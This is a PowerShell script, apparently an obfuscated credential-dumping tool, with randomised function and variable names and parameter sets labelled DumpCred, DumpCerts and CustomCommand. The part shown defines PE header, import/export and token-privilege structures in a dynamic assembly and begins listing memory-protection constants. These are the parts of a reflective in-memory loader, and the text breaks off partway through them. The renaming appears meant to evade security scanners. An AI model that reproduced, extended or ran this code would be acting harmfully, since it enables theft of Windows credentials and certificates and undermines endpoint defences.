function disobliging
{
[CmdletBinding(DefaultParameterSetName="DumpCred")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$YuhhAJEt99,
    [Parameter(ParameterSetName = "DumpCred", Position = 1)]
    [Switch]
    $rSPwjeBb99,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $FcyDhSqZ99,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
$RhGiHIeA99 = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$UESHwemo99,
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$keDFJErN99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$ZEpqwFsf99,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$PZySGmiC99,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$MphyBtCW99,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $gApRtNwy99
	)
	
	Function whitewashes
	{
		$wmxAHjcd99 = New-Object System.Object
		$jRJyNLkA99 = [AppDomain]::CurrentDomain
		$wkWzPQFh99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$rWAnZuej99 = $jRJyNLkA99.DefineDynamicAssembly($wkWzPQFh99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$aqURcyKU99 = $rWAnZuej99.DefineDynamicModule('DynamicModule', $false)
		$EehICbgO99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		$NtiqnmeA99 = $aqURcyKU99.DefineEnum('MachineType', 'Public', [UInt16])
		$NtiqnmeA99.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$NtiqnmeA99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$NtiqnmeA99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$NtiqnmeA99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$XCVBwGMG99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $XCVBwGMG99
		$NtiqnmeA99 = $aqURcyKU99.DefineEnum('MagicType', 'Public', [UInt16])
		$NtiqnmeA99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$jQZXqdkW99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $jQZXqdkW99
		$NtiqnmeA99 = $aqURcyKU99.DefineEnum('SubSystemType', 'Public', [UInt16])
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$knUBTIoE99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $knUBTIoE99
		$NtiqnmeA99 = $aqURcyKU99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$NtiqnmeA99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$NtiqnmeA99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$NtiqnmeA99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$NtiqnmeA99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$NtiqnmeA99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$NtiqnmeA99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$dZVxkTEf99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $dZVxkTEf99
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_DATA_DIRECTORY', $aeaAVLEs99, [System.ValueType], 8)
		($NtiqnmeA99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($NtiqnmeA99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$rrcqlpeo99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $rrcqlpeo99
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_FILE_HEADER', $aeaAVLEs99, [System.ValueType], 20)
		$NtiqnmeA99.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$paZefCEm99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $paZefCEm99
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_OPTIONAL_HEADER64', $aeaAVLEs99, [System.ValueType], 240)
		($NtiqnmeA99.DefineField('Magic', $jQZXqdkW99, 'Public')).SetOffset(0) | Out-Null
		($NtiqnmeA99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($NtiqnmeA99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($NtiqnmeA99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($NtiqnmeA99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($NtiqnmeA99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($NtiqnmeA99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($NtiqnmeA99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($NtiqnmeA99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($NtiqnmeA99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($NtiqnmeA99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($NtiqnmeA99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($NtiqnmeA99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($NtiqnmeA99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($NtiqnmeA99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($NtiqnmeA99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($NtiqnmeA99.DefineField('Subsystem', $knUBTIoE99, 'Public')).SetOffset(68) | Out-Null
		($NtiqnmeA99.DefineField('DllCharacteristics', $dZVxkTEf99, 'Public')).SetOffset(70) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($NtiqnmeA99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($NtiqnmeA99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($NtiqnmeA99.DefineField('ExportTable', $rrcqlpeo99, 'Public')).SetOffset(112) | Out-Null
		($NtiqnmeA99.DefineField('ImportTable', $rrcqlpeo99, 'Public')).SetOffset(120) | Out-Null
		($NtiqnmeA99.DefineField('ResourceTable', $rrcqlpeo99, 'Public')).SetOffset(128) | Out-Null
		($NtiqnmeA99.DefineField('ExceptionTable', $rrcqlpeo99, 'Public')).SetOffset(136) | Out-Null
		($NtiqnmeA99.DefineField('CertificateTable', $rrcqlpeo99, 'Public')).SetOffset(144) | Out-Null
		($NtiqnmeA99.DefineField('BaseRelocationTable', $rrcqlpeo99, 'Public')).SetOffset(152) | Out-Null
		($NtiqnmeA99.DefineField('Debug', $rrcqlpeo99, 'Public')).SetOffset(160) | Out-Null
		($NtiqnmeA99.DefineField('Architecture', $rrcqlpeo99, 'Public')).SetOffset(168) | Out-Null
		($NtiqnmeA99.DefineField('GlobalPtr', $rrcqlpeo99, 'Public')).SetOffset(176) | Out-Null
		($NtiqnmeA99.DefineField('TLSTable', $rrcqlpeo99, 'Public')).SetOffset(184) | Out-Null
		($NtiqnmeA99.DefineField('LoadConfigTable', $rrcqlpeo99, 'Public')).SetOffset(192) | Out-Null
		($NtiqnmeA99.DefineField('BoundImport', $rrcqlpeo99, 'Public')).SetOffset(200) | Out-Null
		($NtiqnmeA99.DefineField('IAT', $rrcqlpeo99, 'Public')).SetOffset(208) | Out-Null
		($NtiqnmeA99.DefineField('DelayImportDescriptor', $rrcqlpeo99, 'Public')).SetOffset(216) | Out-Null
		($NtiqnmeA99.DefineField('CLRRuntimeHeader', $rrcqlpeo99, 'Public')).SetOffset(224) | Out-Null
		($NtiqnmeA99.DefineField('Reserved', $rrcqlpeo99, 'Public')).SetOffset(232) | Out-Null
		$RnecLTlt99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $RnecLTlt99
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_OPTIONAL_HEADER32', $aeaAVLEs99, [System.ValueType], 224)
		($NtiqnmeA99.DefineField('Magic', $jQZXqdkW99, 'Public')).SetOffset(0) | Out-Null
		($NtiqnmeA99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($NtiqnmeA99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($NtiqnmeA99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($NtiqnmeA99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($NtiqnmeA99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($NtiqnmeA99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($NtiqnmeA99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($NtiqnmeA99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($NtiqnmeA99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($NtiqnmeA99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($NtiqnmeA99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($NtiqnmeA99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($NtiqnmeA99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($NtiqnmeA99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($NtiqnmeA99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($NtiqnmeA99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($NtiqnmeA99.DefineField('Subsystem', $knUBTIoE99, 'Public')).SetOffset(68) | Out-Null
		($NtiqnmeA99.DefineField('DllCharacteristics', $dZVxkTEf99, 'Public')).SetOffset(70) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($NtiqnmeA99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($NtiqnmeA99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($NtiqnmeA99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($NtiqnmeA99.DefineField('ExportTable', $rrcqlpeo99, 'Public')).SetOffset(96) | Out-Null
		($NtiqnmeA99.DefineField('ImportTable', $rrcqlpeo99, 'Public')).SetOffset(104) | Out-Null
		($NtiqnmeA99.DefineField('ResourceTable', $rrcqlpeo99, 'Public')).SetOffset(112) | Out-Null
		($NtiqnmeA99.DefineField('ExceptionTable', $rrcqlpeo99, 'Public')).SetOffset(120) | Out-Null
		($NtiqnmeA99.DefineField('CertificateTable', $rrcqlpeo99, 'Public')).SetOffset(128) | Out-Null
		($NtiqnmeA99.DefineField('BaseRelocationTable', $rrcqlpeo99, 'Public')).SetOffset(136) | Out-Null
		($NtiqnmeA99.DefineField('Debug', $rrcqlpeo99, 'Public')).SetOffset(144) | Out-Null
		($NtiqnmeA99.DefineField('Architecture', $rrcqlpeo99, 'Public')).SetOffset(152) | Out-Null
		($NtiqnmeA99.DefineField('GlobalPtr', $rrcqlpeo99, 'Public')).SetOffset(160) | Out-Null
		($NtiqnmeA99.DefineField('TLSTable', $rrcqlpeo99, 'Public')).SetOffset(168) | Out-Null
		($NtiqnmeA99.DefineField('LoadConfigTable', $rrcqlpeo99, 'Public')).SetOffset(176) | Out-Null
		($NtiqnmeA99.DefineField('BoundImport', $rrcqlpeo99, 'Public')).SetOffset(184) | Out-Null
		($NtiqnmeA99.DefineField('IAT', $rrcqlpeo99, 'Public')).SetOffset(192) | Out-Null
		($NtiqnmeA99.DefineField('DelayImportDescriptor', $rrcqlpeo99, 'Public')).SetOffset(200) | Out-Null
		($NtiqnmeA99.DefineField('CLRRuntimeHeader', $rrcqlpeo99, 'Public')).SetOffset(208) | Out-Null
		($NtiqnmeA99.DefineField('Reserved', $rrcqlpeo99, 'Public')).SetOffset(216) | Out-Null
		$WlXeRkfo99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $WlXeRkfo99
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_NT_HEADERS64', $aeaAVLEs99, [System.ValueType], 264)
		$NtiqnmeA99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('FileHeader', $paZefCEm99, 'Public') | Out-Null
		$NtiqnmeA99.DefineField('OptionalHeader', $RnecLTlt99, 'Public') | Out-Null
		$kYDhIymZ99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $kYDhIymZ99
		
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_NT_HEADERS32', $aeaAVLEs99, [System.ValueType], 248)
		$NtiqnmeA99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('FileHeader', $paZefCEm99, 'Public') | Out-Null
		$NtiqnmeA99.DefineField('OptionalHeader', $WlXeRkfo99, 'Public') | Out-Null
		$wdBXieLM99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $wdBXieLM99
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_DOS_HEADER', $aeaAVLEs99, [System.ValueType], 64)
		$NtiqnmeA99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
		$RofPNXHh99 = $NtiqnmeA99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$BzgiQaZB99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$LcLRYYJK99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$dGMcvyyF99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($EehICbgO99, $BzgiQaZB99, $LcLRYYJK99, @([Int32] 4))
		$RofPNXHh99.SetCustomAttribute($dGMcvyyF99)
		$NtiqnmeA99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
		$EQuKTglr99 = $NtiqnmeA99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$BzgiQaZB99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$dGMcvyyF99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($EehICbgO99, $BzgiQaZB99, $LcLRYYJK99, @([Int32] 10))
		$EQuKTglr99.SetCustomAttribute($dGMcvyyF99)
		$NtiqnmeA99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$GJovWaOf99 = $NtiqnmeA99.CreateType()	
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $GJovWaOf99
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_SECTION_HEADER', $aeaAVLEs99, [System.ValueType], 40)
		$zFsPpvIG99 = $NtiqnmeA99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$BzgiQaZB99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$dGMcvyyF99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($EehICbgO99, $BzgiQaZB99, $LcLRYYJK99, @([Int32] 8))
		$zFsPpvIG99.SetCustomAttribute($dGMcvyyF99)
		$NtiqnmeA99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$HRxOpSLV99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $HRxOpSLV99
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_BASE_RELOCATION', $aeaAVLEs99, [System.ValueType], 8)
		$NtiqnmeA99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$pivVlZjv99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $pivVlZjv99
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $aeaAVLEs99, [System.ValueType], 20)
		$NtiqnmeA99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$pOnNYAfa99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $pOnNYAfa99
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('IMAGE_EXPORT_DIRECTORY', $aeaAVLEs99, [System.ValueType], 40)
		$NtiqnmeA99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('Base', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$cZGZrHKg99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $cZGZrHKg99
		
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('LUID', $aeaAVLEs99, [System.ValueType], 8)
		$NtiqnmeA99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('LUID_AND_ATTRIBUTES', $aeaAVLEs99, [System.ValueType], 12)
		$NtiqnmeA99.DefineField('Luid', $LUID, 'Public') | Out-Null
		$NtiqnmeA99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$aoqlvdgE99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $aoqlvdgE99
		
		$aeaAVLEs99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$NtiqnmeA99 = $aqURcyKU99.DefineType('TOKEN_PRIVILEGES', $aeaAVLEs99, [System.ValueType], 16)
		$NtiqnmeA99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$NtiqnmeA99.DefineField('Privileges', $aoqlvdgE99, 'Public') | Out-Null
		$LObUTMuG99 = $NtiqnmeA99.CreateType()
		$wmxAHjcd99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $LObUTMuG99
		return $wmxAHjcd99
	}
	Function forgathered
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
